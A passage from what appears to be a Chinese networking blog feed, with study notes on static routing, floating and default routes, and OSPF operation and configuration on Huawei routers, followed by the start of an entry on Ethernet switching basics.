最长匹配原则</h3><ul><li><p>路由器在转发数据时，需要选择路由表中的最优路由。当数据报文到达路由器时，路由器首先提取出报文的目的IP地址，然后查找路由表，将报文的目的IP地址与路由表中某表项的掩码字段做“与”操作，“与”操作后的结果跟路由表该表项的目的IP地址比较，相同则匹配上，否则就没有匹配上。当与所有的路由表项都进行匹配后，路由器会选择一个掩码最长的匹配项</p></li><li><p>如图所示</p><p><img src="https://pic.imgdb.cn/item/60f4f04c5132923bf8b1d023.png"></p><p>路由表中有两个表项到达目的网段10.1.1.0，下一跳地址都是20.1.1.2。如果要将报文转发至网段10.1.1.1，则10.1.1.0/30符合最长匹配原则</p></li></ul><h3 id="1-9-路由器转发数据包"><a href="#1-9-路由器转发数据包" class="headerlink" title="1.9 路由器转发数据包"></a>1.9 路由器转发数据包</h3><p>路由器收到一个数据包后，会检查其目的IP地址，然后查找路由表。查找到匹配的路由表项之后，路由器会根据该表项所指示的出接口信息和下一跳信息将数据包转发出去</p><h2 id="2-静态路由基础"><a href="#2-静态路由基础" class="headerlink" title="2. 静态路由基础"></a>2. 静态路由基础</h2><h3 id="2-1-静态路由应用场景"><a href="#2-1-静态路由应用场景" class="headerlink" title="2.1 静态路由应用场景"></a>2.1 静态路由应用场景</h3><ul><li>静态路由是指由管理员手动配置和维护的路由</li><li>静态路由配置简单，并且无需像动态路由那样占用路由器的CPU资源来计算和分析路由更新</li><li>静态路由的缺点在于，当网络拓扑发生变化时，静态路由不会自动适应拓扑改变，而是需要管理员手动进行调整</li><li>静态路由一般适用于结构简单的网络。在复杂网络环境中，一般会使用动态路由协议来生成动态路由。不过，即使是在复杂网络环境中，合理地配置一些静态路由也可以改进网络的性能</li></ul><h3 id="2-2-静态路由配置"><a href="#2-2-静态路由配置" class="headerlink" title="2.2 静态路由配置"></a>2.2 静态路由配置</h3><p><code>ip route-static</code> <em>ip-address { mask | mask-length } interface-type interface-number[ nexthop-address]</em>  命令用来配置静态路由</p><ol><li>参数ip-address指定了一个网络或者主机的目的地址</li><li>参数mask指定了一个子网掩码或者前缀长度。如果使用了广播接口如以太网接口作为出接口，则必须要指定下一跳地址</li><li>如果使用了串口作为出接口，则可以通过参数interface-type和interface-number (如Serial 1/0/0)来配置出接口，此时不必指定下一跳地址</li></ol><h3 id="2-3-静态路由"><a href="#2-3-静态路由" class="headerlink" title="2.3 静态路由"></a>2.3 静态路由</h3><ul><li>静态路由可以应用在串行网络或以太网中，但静态路由在这两种网络中的配置有所不同</li><li>在串行网络中配置静态路由时，可以只指定下一跳地址或只指定出接口。华为ARG3系列路由器中，串行接口默认封装PPP协议，对于这种类型的接口，静态路由的下一跳地址就是与接口相连的对端接口的地址，所以在串行网络中配置静态路由时可以只配置出接口</li><li>以太网是广播类型网络，和串行网络情况不同。在以太网中配置静态路由，必须指定下一跳地址</li><li>在广播型的接口上配置静态路由时，必须明确指定下一跳地址。以太网中同一网络可能连接了多台路由器，如果在配置静态路由时只指定了出接口，则路由器无法将报文转发到正确的下一跳</li></ul><h3 id="2-4-负载分担"><a href="#2-4-负载分担" class="headerlink" title="2.4 负载分担"></a>2.4 负载分担</h3><ul><li><p>当源网络和目的网络之间存在多条链路时，可以通过等价路由来实现流量负载分担。这些等价路由具有相同的目的网络和掩码、优先级和度量值</p></li><li><p><img src="https://pic.imgdb.cn/item/60f4fd045132923bf8f63d00.png"></p><p>本示例中RTA和RTB之间有两条链路相连，通过使用等价的静态路由来实现流量负载分担</p></li><li><p>在RTB上配置了两条静态路由，它们具有相同的目的IP地址和子网掩码、优先级（都为60)、路由开销（都为0），但下一跳不同。在RTB需要转发数据给RTA时，就会使用这两条等价静态路由将数据进行负载分担</p></li><li><p>在RTA上也应该配置对应的两条等价的静态路由</p></li></ul><h3 id="2-5-配置验证"><a href="#2-5-配置验证" class="headerlink" title="2.5 配置验证"></a>2.5 配置验证</h3><ul><li><p>在配置完静态路由之后，可以使用<code>display ip routing-table</code>命令来验证配置结果。在本示例中，红色高亮部分代表路由表中的静态路由。这两条路由具有相同的目的地址和掩码，并且有相同的优先级和度量值，但是它们的下一跳地址和出接口不同。此时，RTB就可以通过这两条等价路由实现负载分担</p><p><img src="https://pic.imgdb.cn/item/60f4ff635132923bf8043cfb.png"></p></li></ul><h3 id="2-6-路由备份"><a href="#2-6-路由备份" class="headerlink" title="2.6 路由备份"></a>2.6 路由备份</h3><p>在配置多条静态路由时，可以修改静态路由的优先级，使一条静态路由的优先级高于其他静态路由，从而实现静态路由的备份，也叫浮动静态路由。在本示例中，RTB上配置了两条静态路由。正常情况下，这两条静态路由是等价的</p><p><img src="https://pic.imgdb.cn/item/60f5000c5132923bf8086d65.png"></p><p>通过配置preference 100，使第二条静态路由的优先级要低于第一条(值越大优先级越低)。路由器只把优先级最高的静态路由加入到路由表中。当加入到路由表中的静态路由出现故障时，优先级低的静态路由才会加入到路由表并承担数据转发业务</p><h3 id="2-7-配置验证"><a href="#2-7-配置验证" class="headerlink" title="2.7 配置验证"></a>2.7 配置验证</h3><ul><li><p>从<code>display ip routing-table</code>命令的回显信息</p><p><img src="https://pic.imgdb.cn/item/60f500855132923bf80b6673.png"></p><p>可以看出，通过修改静态路由优先级实现了浮动静态路由。正常情况下，路由表中应该显示两条有相同目的地、但不同下一跳和出接口的等价路由。由于修改了优先级，回显中只有一条默认优先级为60的静态路由。另一条静态路由的优先级是100，该路由优先级低，所以不会显示在路由表中</p></li><li><p>当主用静态路由出现物理链路故障或者接口故障时，该静态路由不能再提供到达目的地的路径，所以在路由表中会被删除</p><p>此时，浮动静态路由会被加入到路由表，以保证报文能够从备份链路成功转发到目的地。在主用静态路由的物理链路恢复正常后，主用静态路由会重新被加入到路由表，并且数据转发业务会从浮动静态路由切换到主用静态路由，而浮动静态路由会在路由表中再次被隐藏</p></li></ul><h3 id="2-8-缺省路由"><a href="#2-8-缺省路由" class="headerlink" title="2.8 缺省路由"></a>2.8 缺省路由</h3><ol><li><p>当路由表中没有与报文的目的地址匹配的表项时，设备可以选择缺省路由作为报文的转发路径</p><p>在路由表中，缺省路由的目的网络地址为0.0.0.0，掩码也为0.0.0.0</p><p>在本示例中</p><p><img src="https://pic.imgdb.cn/item/60f5018c5132923bf81205bc.png"></p><p>RTA使用缺省路由转发到达未知目的地址的报文。缺省静态路由的默认优先级也是60。在路由选择过程中，缺省路由会被最后匹配</p></li></ol><h3 id="2-9-配置验证2"><a href="#2-9-配置验证2" class="headerlink" title="2.9 配置验证2"></a>2.9 配置验证2</h3><p>配置缺省路由后，可以使用<code>display ip routing-table</code>命令来查看该路由的详细信息</p><p>在本示例中，目的地址在路由表中没能匹配的所有报文都将通过GigabitEthernet 0/0/0接口转发到下一跳地址10.0.12.2。</p><h2 id="3-链路状态路由协议-OSPF"><a href="#3-链路状态路由协议-OSPF" class="headerlink" title="3. 链路状态路由协议-OSPF"></a>3. 链路状态路由协议-OSPF</h2><h3 id="3-1-开放式最短路径优先-OSPF"><a href="#3-1-开放式最短路径优先-OSPF" class="headerlink" title="3.1 开放式最短路径优先(OSPF)"></a>3.1 开放式最短路径优先(OSPF)</h3><ol><li>OSPF是一种基于链路状态的路由协议，它从设计上就保证了无路由环路。OSPF支持区域的划分，区域内部的路由器使用SPF最短路径算法保证了区域内部的无环路。OSPF还利用区域间的连接规则保证了区域之间无路由环路</li><li>OSPF支持触发更新，能够快速检测并通告自治系统内的拓扑变化</li><li>OSPF可以解决网络扩容带来的问题。当网络上路由器越来越多，路由信息流量急剧增长的时候，OSPF可以将每个自治系统划分为多个区域，并限制每个区域的范围。OSPF这种分区域的特点，使得OSPF特别适用于大中型网络。OSPF可以提供认证功能。OSPF路由器之间的报文可以配置成必须经过认证才能进行交换</li></ol><h3 id="3-2-OSPF-原理介绍"><a href="#3-2-OSPF-原理介绍" class="headerlink" title="3.2 OSPF 原理介绍"></a>3.2 OSPF 原理介绍</h3><ul><li>OSPF要求每台运行OSPF的路由器都了解整个网络的链路状态信息，这样才能计算出到达目的地的最优路径</li><li>OSPF的收敛过程由链路状态公告LSA ( Link State Advertisement)泛洪开始，LSA中包含了路由器已知的接口IP地址、掩码、开销和网络类型等信息</li><li>收到LSA的路由器都可以根据LSA提供的信息建立自己的链路状态数据库LSDB(Link StateDatabase)，并在LSDB的基础上使用SPF算法进行运算，建立起到达每个网络的最短路径树</li><li>最后，通过最短路径树得出到达目的网络的最优路由，并将其加入到IP路由表中</li></ul><h3 id="3-3-OSPF-报文"><a href="#3-3-OSPF-报文" class="headerlink" title="3.3 OSPF 报文"></a>3.3 OSPF 报文</h3><ul><li>OSPF直接运行在IP协议之上，使用IP协议号89</li><li>OSPF有五种报文类型，每种报文都使用相同的OSPF报文头<ol><li>Hello报文：最常用的一种报文，用于发现、维护邻居关系。并在广播和NBMA (None-Broadcast Multi-Access)类型的网络中选举指定路由器DR(Designated Router)和备份指定路由器BDR( Backup Designated Router)</li><li>DD报文：两台路由器进行LSDB数据库同步时，用DD报文来描述自己的LSDB。DD报文的内容包括LSDB中每一条LSA的头部(LSA的头部可以唯一标识一条LSA) </li><li>LSA头部只占一条LSA的整个数据量的一小部分，所以，这样就可以减少路由器之间的协议报文流量。LSR报文：两台路由器互相交换过DD报文之后，知道对端的路由器有哪些LSA是本地LSDB所缺少的，这时需要发送LSR报文向对方请求缺少的LSA，LSR只包含了所需要的LSA的摘要信息</li><li>LSU报文：用来向对端路由器发送所需要的LSA</li><li>LSACK报文：用来对接收到的LSU报文进行确认</li></ol></li></ul><h3 id="3-4-邻居状态机"><a href="#3-4-邻居状态机" class="headerlink" title="3.4 邻居状态机"></a>3.4 邻居状态机</h3><p>邻居和邻接关系建立的过程如下</p><ol><li>Down：这是邻居的初始状态，表示没有在邻居失效时间间隔内收到来自邻居路由器的Hello数据包</li><li>Attempt：此状态只在NBMA网络上存在，表示没有收到邻居的任何信息，但是已经周期性的向邻居发送报文，发送间隔为HelloInterval。如果RouterDeadInterval间隔内未收到邻居的Hello报文，则转为Down状态</li><li>Init：在此状态下，路由器已经从邻居收到了Hello报文，但是自己不在所收到的Hello报文的邻居列表中，尚未与邻居建立双向通信关系</li><li>2-Way：在此状态下，双向通信已经建立，但是没有与邻居建立邻接关系。这是建立邻接关系以前的最高级状态</li><li>ExStart：这是形成邻接关系的第一个步骤，邻居状态变成此状态以后，路由器开始向邻居发送DD报文。主从关系是在此状态下形成的，初始DD序列号也是在此状态下决定的。在此状态下发送的DD报文不包含链路状态描述</li><li>Exchange：此状态下路由器相互发送包含链路状态信息摘要的DD报文，描述本地LSDB的内容</li><li>Loading：相互发送LSR报文请求LSA，发送LSU报文通告LSA</li><li>Full：路由器的LSDB已经同步</li></ol><h3 id="3-5-Router-ID、邻居和邻接"><a href="#3-5-Router-ID、邻居和邻接" class="headerlink" title="3.5 Router ID、邻居和邻接"></a>3.5 Router ID、邻居和邻接</h3><ul><li><p>Router ID是一个32位的值，它唯一标识了一个自治系统内的路由器，管理员可以为每台运行OSPF的路由器手动配置一个Router ID。如果未手动指定，设备会按照以下规则自动选举Router ID：</p><ol><li><p>如果设备存在多个逻辑接口地址，则路由器使用逻辑接口中最大的IP地址作为Router ID</p></li><li><p>如果没有配置逻辑接口，则路由器使用物理接口的最大IP地址作为RouterID</p></li></ol></li><li><p>在为一台运行OSPF的路由器配置新的Router ID后，可以在路由器上通过重置OSPF进程来更新Router ID。通常建议手动配置Router ID，以防止Router ID因为接口地址的变化而改变。</p></li><li><p>运行OSPF的路由器之间需要交换链路状态信息和路由信息，在交换这些信息之前路由器之间首先需要建立邻接关系。</p></li><li><p>邻居(Neighbor)：</p><ul><li>OSPF路由器启动后，便会通过OSPF接口向外发送Hello报文用于发现邻居。收到Hello报文的OSPF路由器会检查报文中所定义的一些参数，如果双方的参数一致，就会彼此形成邻居关系，状态到达2-way即可称为建立了邻居关系</li></ul></li><li><p>邻接(Adjacency)：</p><ul><li>形成邻居关系的双方不一定都能形成邻接关系，这要根据网络类型而定。只有当双方成功交换DD报文，并同步LSDB后，才形成真正意义上的邻接关系。</li></ul></li><li><p>本例中</p><p>  <img src="https://pic.imgdb.cn/item/60f51a355132923bf8cda439.png"></p><p>  RTA通过以太网连接了三个路由器，所以RTA有三个邻居，但不能说RTA有三邻接关系。</p></li></ul><h3 id="3-6-邻居发现"><a href="#3-6-邻居发现" class="headerlink" title="3.6 邻居发现"></a>3.6 邻居发现</h3><p>OSPF的邻居发现过程是基于Hello报文来实现的，Hello报文中的重要字段解释如下：</p><ol><li>Network Mask：发送Hello报文的接口的网络掩码</li><li>Hello Interval：发送Hello报文的时间间隔，单位为秒</li><li>Options：标识发送此报文的OSPF路由器所支持的可选功能。具体的可选功能已超出这里的讨论范围</li><li>Router Priority：发送Hello报文的接口的Router Priority，用于选举DR和BDR</li><li>Router Dead Interval：失效时间。如果在此时间内未收到邻居发来的Hello报文，则认为邻居失效；单位为秒，通常为四倍Hello Interval</li><li>Designated Router：发送Hello报文的路由器所选举出的DR的IP地址。如果设置为0.0.0.0，表示未选举DR路由器</li><li>Backup Designated Router：发送Hello报文的路由器所选举出的BDR的IP地址。如果设置为0.0.0.0，表示未选举BDR</li><li>Neighbor：邻居的Router ID列表，表示本路由器已经从这些邻居收到了合法的Hello报文</li></ol><ul><li>如果路由器发现所接收的合法Hello报文的邻居列表中有自己的Router ID，则认为已经和邻居建立了双向连接，表示邻居关系已经建立</li><li>验证一个接收到的Hello报文是否合法包括：<ol><li>如果接收端口的网络类型是广播型，点到多点或者NBMA，所接收的Hello报文中Network Mask字段必须和接收端口的网络掩码一致，如果接收端口的网络类型为点到点类型或者是虚连接，则不检查Network Mask字段</li><li>所接收的Hello报文中Hello Interval字段必须和接收端口的配置一致</li><li>所接收的Hello报文中Router Dead Interval字段必须和接收端口的配置一致</li><li>所接收的Hello报文中Options字段中的E-bit(表示是否接收外部路由信息)必须和相关区域的配置一致</li></ol></li></ul><h3 id="3-7-数据库同步"><a href="#3-7-数据库同步" class="headerlink" title="3.7 数据库同步"></a>3.7 数据库同步</h3><ul><li><p>如图所示，路由器在建立完成邻居关系之后，便开始进行数据库同步，具体过程如下：</p><p><img src="https://pic.imgdb.cn/item/60f51bc95132923bf8da9d3b.png"></p><ol><li>邻居状态变为ExStart以后，RTA向RTB发送第一个DD报文，在这个报文中，DD序列号被设置为X(假设)，RTA宣告自己为主路由器</li><li>RTB也向RTA发送第一个DD报文，在这个报文中，DD序列号被设置为Y(假设)。RTB也宣告自己为主路由器。由于RTB的Router ID比RTA的大，所以RTB应当为真正的主路由器</li><li>RTA发送一个新的DD报文，在这个新的报文中包含LSDB的摘要信息，序列号设置为RTB在步骤2里使用的序列号，因此RTB将邻居状态改变为Exchange</li><li>邻居状态变为Exchange以后，RTB发送一个新的DD报文，该报文中包含LSDB的描述信息，DD序列号设为Y+1(上次使用的序列号加1)</li><li>即使RTA不需要新的DD报文描述自己的LSDB，但是作为从路由器，RTA需要对主路由器RTB发送的每一个DD报文进行确认。所以，RTA向RTB发送一个内容为空的DD报文，序列号为Y+1</li><li>发送完最后一个DD报文之后，RTA将邻居状态改变为Loading ; RTB收到最后一个DD报文之后，改变状态为Full(假设RTB的LSDB是最新最全的，不需要向RTA请求更新)</li></ol></li></ul><h3 id="3-8-建立完全邻接关系"><a href="#3-8-建立完全邻接关系" class="headerlink" title="3.8 建立完全邻接关系"></a>3.8 建立完全邻接关系</h3><p><img src="https://pic.imgdb.cn/item/60f51c975132923bf8e10f9c.png"></p><ol start="7"><li>邻居状态变为Loading之后，RTA开始向RTB发送LSR报文，请求那些在Exchange状态下通过DD报文发现的，而且在本地LSDB中没有的链路状态信息。</li><li>RTB收到LSR报文之后，向RTA发送LSU报文，在LSU报文中，包含了那些被请求的链路状态的详细信息，RTA收到LSU报文之后，将邻居状态从Loading改变成Full</li><li>RTA向RTB发送LSACK报文，用于对已接收LSA的确认</li><li>此时，RTA和RTB之间的邻居状态变成Full，表示达到完全邻接状态</li></ol><h3 id="3-9-OSPF支持的网络类型"><a href="#3-9-OSPF支持的网络类型" class="headerlink" title="3.9 OSPF支持的网络类型"></a>3.9 OSPF支持的网络类型</h3><p>OSPF定义了四种网络类型，分别是点到点网络，广播型网络，NBMA网络和点到多点网络</p><ol><li>点到点网络是指只把两台路由器直接相连的网络。一个运行PPP的64K串行线路就是一个点到点网络的例子</li><li>广播型网络是指支持两台以上路由器，并且具有广播能力的网络。一个含有三台路由器的以太网就是一个广播型网络的例子</li></ol><p>OSPF可以在不支持广播的多路访问网络上运行，此类网络包括在hub-spoke拓扑上运行的帧中继(FR)和异步传输模式(ATM)网络，这些网络的通信依赖于虚电路</p><p>OSPF定义了两种支持多路访问的网络类型:非广播多路访问网络(NBMA)和点到多点网络(PointTo Multi-Points)</p><ol><li>NBMA：在NBMA网络上，OSPF模拟在广播型网络上的操作，但是每个路由器的邻居需要手动配置。NBMA方式要求网络中的路由器组成全连接</li><li>P2MP：将整个网络看成是一组点到点网络。对于不能组成全连接的网络应当使用点到多点方式，例如只使用PVC的不完全连接的帧中继网络</li></ol><h3 id="3-10-DR-amp-BDR"><a href="#3-10-DR-amp-BDR" class="headerlink" title="3.10 DR&amp;BDR"></a>3.10 DR&amp;BDR</h3><p>每一个含有至少两个路由器的广播型网络和NBMA网络都有一个DR和BDR</p><p>DR和BDR可以减少邻接关系的数量，从而减少链路状态信息以及路由信息的交换次数，这样可以节省带宽，降低对路由器处理能力的压力</p><p>一个既不是DR也不是BDR的路由器只与DR和BDR形成邻接关系并交换链路状态信息以及路由信息，这样就大大减少了大型广播型网络和NBMA网络中的邻接关系数量</p><p>在没有DR的广播网络上，邻接关系的数量可以根据公式n(n-1)/2计算出，n代表参与OSPF的路由器接口的数量</p><p>在本例中</p><p><img src="https://pic.imgdb.cn/item/60f51d945132923bf8e94154.png"></p><p>所有路由器之间有6个邻接关系。当指定了DR后，所有的路由器都与DR建立起邻接关系，DR成为该广播网络上的中心点</p><p>BDR在DR发生故障时接管业务，一个广播网络上所有路由器都必须同BDR建立邻接关系。本例中使用DR和BDR将邻接关系从6减少到了5，RTA和RTB都只需要同DR和BDR建立邻接关系，RTA和RTB之间建立的是邻居关系</p><p>此例中，邻接关系数量的减少效果并不明显。但是，当网络上部署了大量路由器时，比如100台，那么情况就大不一样了</p><h3 id="3-11-DR-amp-BDR选举"><a href="#3-11-DR-amp-BDR选举" class="headerlink" title="3.11 DR&amp;BDR选举"></a>3.11 DR&amp;BDR选举</h3><ul><li>在邻居发现完成之后，路由器会根据网段类型进行DR选举。在广播和NBMA网络上，路由器会根据参与选举的每个接口的优先级进行DR选举。优先级取值范围为0-255，值越高越优先。缺省情况下，接口优先级为1。如果一个接口优先级为0，那么该接口将不会参与DR或者BDR的选举。如果优先级相同时，则比较Router ID，值越大越优先被选举为DR</li><li>为了给DR做备份，每个广播和NBMA网络上还要选举一个BDR。BDR也会与网络上所有的路由器建立邻接关系</li><li>为了维护网络上邻接关系的稳定性，如果网络中已经存在DR和BDR，则新添加进该网络的路由器不会成为DR和BDR，不管该路由器的Router Priority是否最大</li><li>如果当前DR发生故障，则当前BDR自动成为新的DR，网络中重新选举BDR；如果当前BDR发生故障，则DR不变，重新选举BDR。这种选举机制的目的是为了保持邻接关系的稳定，使拓扑结构的改变对邻接关系的影响尽量小</li></ul><h3 id="3-12-OSPF-区域"><a href="#3-12-OSPF-区域" class="headerlink" title="3.12 OSPF 区域"></a>3.12 OSPF 区域</h3><ul><li>OSPF支持将一组网段组合在一起，这样的一个组合称为一个区域</li><li>划分OSPF区域可以缩小路由器的LSDB规模，减少网络流量</li><li>区域内的详细拓扑信息不向其他区域发送，区域间传递的是抽象的路由信息，而不是详细的描述拓扑结构的链路状态信息</li><li>每个区域都有自己的LSDB，不同区域的LSDB是不同的。路由器会为每一个自己所连接到的区域维护一个单独的LSDB。由于详细链路状态信息不会被发布到区域以外，因此LSDB的规模大大缩小了</li><li>Area 0为骨干区域，为了避免区域间路由环路，非骨干区域之间不允许直接相互发布路由信息。因此，每个区域都必须连接到骨干区域</li><li>运行在区域之间的路由器叫做区域边界路由器ABR (Area Boundary Router)，它包含所有相连区域的LSDB。自治系统边界路由器ASBR(Autonomous System BoundaryRouter)是指和其他AS中的路由器交换路由信息的路由器，这种路由器会向整个AS通告AS外部路由信息</li><li>在规模较小的企业网络中，可以把所有的路由器划分到同一个区域中，同一个OSPF区域中的路由器中的LSDB是完全一致的。OSPF区域号可以手动配置，为了便于将来的网络扩展，推荐将该区域号设置为0，即骨干区域</li></ul><h3 id="3-13-OSPF-开销"><a href="#3-13-OSPF-开销" class="headerlink" title="3.13 OSPF 开销"></a>3.13 OSPF 开销</h3><ul><li>OSPF基于接口带宽计算开销，计算公式为∶接口开销=带宽参考值÷带宽。带宽参考值可配置，缺省为100Mbit/s。以此，一个64kbit/s串口的开销为1562，一个E1接口( 2.048Mbit/s )的开销为48</li><li>命令<code>bandwidth-reference</code>可以用来调整带宽参考值，从而可以改变接口开销，带宽参考值越大，开销越准确。在支持10Gbit/s速率的情况下，推荐将带宽参考值提高到10000Mbit/s来分别为10 Gbit/s、1 Gbit/s和100Mbit/s的链路提供1、10和100的开销。注意，配置带宽参考值时，需要在整个OSPF网络中统一进行调整</li><li>另外，还可以通过<code>ospf cost</code>命令来手动为一个接口调整开销，开销值范围是1~65535，缺省值为1</li></ul><h3 id="3-14-OSPF-配置"><a href="#3-14-OSPF-配置" class="headerlink" title="3.14 OSPF 配置"></a>3.14 OSPF 配置</h3><ol><li>在配置OSPF时，需要首先使能用OSPF进程</li><li>命令<code>ospf</code> <em>[process id]</em> 用来使能OSPF，在该命令中可以配置进程ID。如果没有配置进程ID，则使用1作为缺省进程ID</li><li>命令<code>ospf</code> <em>[process id] [router-id &lt;router-id&gt;]</em> 既可以使能OSPF进程，还同时可以用于配置Router ID。在该命令中，router-id代表路由器的ID</li><li>命令<code>network</code>用于指定运行OSPF协议的接口，在该命令中需要指定一个反掩码。反掩码中，“0”表示此位必须严格匹配，“1”表示该地址可以为任意值</li></ol><h3 id="3-15-配置验证"><a href="#3-15-配置验证" class="headerlink" title="3.15 配置验证"></a>3.15 配置验证</h3><p>命令<code>display ospf peer</code>可以用于查看邻居相关的属性，包括区域、邻居的状态、邻接协商的主从状态以及DR和BDR情况</p><h3 id="3-16-OSPF认证"><a href="#3-16-OSPF认证" class="headerlink" title="3.16 OSPF认证"></a>3.16 OSPF认证</h3><ul><li>OSPF支持简单认证及加密认证功能，加密认证对潜在的攻击行为有更强的防范性</li><li>OSPF认证可以配置在接口或区域上，配置接口认证方式的优先级高于区域认证方式</li><li>接口或区域上都可以运行<code>ospf authentication-mode</code> <em>{ simple [ [ plain ] &lt;plain-text&gt; lcipher &lt;cipher-text&gt;] |null }</em> 命令来配置简单认证，参数simple表示使用明文传输密码，参数plain表示密码以明文形式存放在设备中，参数cipher表示密码以密文形式存放在设备中，参数null表示不认证</li><li>命令<code>ospf authentication-mode</code> <em>{ md5 | hmac-md5 } [ key-id ( plain &lt;plain-text &gt;l[ cipher ] &lt;cipher-text&gt;}]</em> 用于配置加密认证，MD5是一种保证链路认证安全的加密算法(具体配置已在举例中给出），参数key-id表示接口加密认证中的认证密钥ID，它必须与对端上的key-id一致</li></ul><h3 id="3-17-配置认证2"><a href="#3-17-配置认证2" class="headerlink" title="3.17 配置认证2"></a>3.17 配置认证2</h3><ul><li>在启用认证功能之后，可以在终端上进行调试来查看认证过程</li><li><code>debugging ospf packet</code>命令用来指定调试OSPF报文，然后便可以查看认证过程，以确定认证配置是否成功</li></ul>]]></content>
    
    
    <categories>
      
      <category>网络基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络基础</tag>
      
      <tag>路由技术介绍</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>交换网络基础,STP、RSTP原理与配置</title>
    <link href="/2021/07/18/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/%E4%BA%A4%E6%8D%A2%E6%8A%80%E6%9C%AF%E4%BB%8B%E7%BB%8D/%E4%BA%A4%E6%8D%A2%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80,STP%E3%80%81RSTP%E5%8E%9F%E7%90%86%E4%B8%8E%E9%85%8D%E7%BD%AE/"/>
    <url>/2021/07/18/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/%E4%BA%A4%E6%8D%A2%E6%8A%80%E6%9C%AF%E4%BB%8B%E7%BB%8D/%E4%BA%A4%E6%8D%A2%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80,STP%E3%80%81RSTP%E5%8E%9F%E7%90%86%E4%B8%8E%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="交换网络基础-STP、RSTP原理与配置"><a href="#交换网络基础-STP、RSTP原理与配置" class="headerlink" title="交换网络基础,STP、RSTP原理与配置"></a>交换网络基础,STP、RSTP原理与配置</h1><h2 id="1-交换网络基础"><a href="#1-交换网络基础" class="headerlink" title="1. 交换网络基础"></a>1. 交换网络基础</h2><h3 id="1-1-交换网络介绍"><a href="#1-1-交换网络介绍" class="headerlink" title="1.1 交换网络介绍"></a>1.1 交换网络介绍</h3><p><strong>交换机工作在数据链路层，转发数据帧</strong></p><ul><li>随着企业网络的发展，越来越多的用户需要接入到网络，交换机提供的大量的接入端口能够很好地满足这种需求。同时，交换机也彻底解决了困扰早期以太网的冲突问题，极大地提升了以太网的性能，同时也提高了以太网的安全性</li><li>交换机工作在数据链路层，对数据帧进行操作。在收到数据帧后，交换机会根据数据帧的头部信息对数据帧进行转发</li></ul><p>接下来以小型交换网络为例，讲解交换机的基本工作原理</p><h3 id="1-2-交换机的转发行为"><a href="#1-2-交换机的转发行为" class="headerlink" title="1.2 交换机的转发行为"></a>1.2 交换机的转发行为</h3><ul><li>交换机中有一个MAC地址表，里面存放了MAC地址与交换机端口的映射关系。MAC地址表也称为CAM ( Content Addressable Memory )表</li><li>交换机对帧的转发操作行为一共有三种︰泛洪(Flooding)，转发(（Forwarding )，丢<br>弃(Discarding )<ol><li>泛洪∶交换机把从某一端口进来的帧通过所有其它的端口转发出去（注意，“所有其它的端口”是指除了这个帧进入交换机的那个端口以外的所有端口)。</li><li>转发∶交换机把从某一端口进来的帧通过另一个端口转发出去（注意，“另一个端口”不能是这个帧进入交换机的那个端口)。</li><li>丢弃∶交换机把从某一端口进来的帧直接丢弃。</li></ol></li><li>交换机的基本工作原理可以概括地描述如下∶<ol><li>如果进入交换机的是一个单播帧，则交换机会去MAC地址表中查找这个帧的目的MAC地址<ol><li>如果查不到这个MAC地址，则交换机执行泛洪操作</li><li>如果查到了这个MAC地址，则比较这个MAC地址在MAC地址表中对应的端口是不是这个帧进入交换机的那个端口。如果不是，则交换机执行转发操作。如果是，则交换机执行丢弃操作。</li></ol></li><li>如果进入交换机的是一个广播帧，则交换机不会去查MAC地址表，而是直接执行泛洪操作</li><li>如果进入交换机的是一个组播帧，则交换机的处理行为比较复杂，超出了这里的学习范围，所以略去不讲。   另外，交换机还具有学习能力。当一个帧进入交换机后，交换机会检查这个帧的源MAC地址，并将该源MAC地址与这个帧进入交换机的那个端口进行映射，然后将这个映射关系存放进MAC地址表</li></ol></li></ul><h3 id="1-3-交换机初始状态"><a href="#1-3-交换机初始状态" class="headerlink" title="1.3 交换机初始状态"></a>1.3 交换机初始状态</h3><p>初始状态下，交换机并不知道所连接主机的MAC地址，所以MAC地址表为空。本例中SWA为初始状态，在收到主机A发送的数据帧之前，MAC地址表中没有任何表项。</p><h3 id="1-4-学习MAC地址"><a href="#1-4-学习MAC地址" class="headerlink" title="1.4 学习MAC地址"></a>1.4 学习MAC地址</h3><p>交换机将收到的数据帧的源MAC地址和对应接口记录到MAC地址表中</p><h3 id="1-5-转发数据帧"><a href="#1-5-转发数据帧" class="headerlink" title="1.5 转发数据帧"></a>1.5 转发数据帧</h3><p>当数据帧的目的MAC地址不在MAC表中，或则目的MAC地址为寡广播地址时，交换机会防洪该帧</p><h3 id="1-6-目标主机回复"><a href="#1-6-目标主机回复" class="headerlink" title="1.6 目标主机回复"></a>1.6 目标主机回复</h3><p>主机接收到此数据帧后，都会查看该ARP数据帧。如果主机MAC地址是目标地址会处理该帧并发送ARP回应，此回复数据帧的目的MAC地址为发送主机的MAC地址，源MAC地址为主机的MAC地址。SWA收到回复数据帧时，会将该帧的源MAC地址和接口的映射关系添加到MAC地址表中。如果此映射关系在MAC地址表已经存在，则会被刷新。然后SWA查询MAC地址表，根据帧的目的MAC地址找到对应的转发端口后，从G0/0/1转发此数据帧</p><h3 id="1-7-基本配置"><a href="#1-7-基本配置" class="headerlink" title="1.7 基本配置"></a>1.7 基本配置</h3><ul><li><p>早期的以太网的工作模式都是10M半双工的。随着技术的发展，出现了全双工模式，接着又出现了百兆和千兆以太网。采用不同工作模式的设备无法直接相互通信;自协商技术的出现解决了不同以太网工作模式之间的兼容性问题。自协商的内容主要包括双工模式和运行速率。一旦协商通过，链路两端的设备就具有相同的工作参数</p></li><li><p><code>negotiation auto</code>命令用来设置以太网端口的自协商功能</p><p>端口是否应该使能自协商模式，要考虑对接双方设备的端口是否都支持自动协商。如果对端设备的以太网端口不支持自协商模式，则需要在本端端口上先使用<code>undo negotiation auto</code>命令配置为非自协商模式。之后，修改本端端口的速率和双工模式保持与对端一致，确保通信正常</p></li><li><p><code>duplex</code>命令用来设置以太网端口的双工模式。GE电口工作速率为1000Mbitls时，只支持全双工模式，不需要与链路对端的端口共同协商双工模式</p></li><li><p><code>speed</code>命令用来设置端口的工作速率。配置端口的速率和双工模式之前需要先配置端口为非自协商模式</p></li><li><p>因产品型号不同，华为交换机可能不支持更改端口双工模式</p></li></ul><h3 id="1-8-配置验证"><a href="#1-8-配置验证" 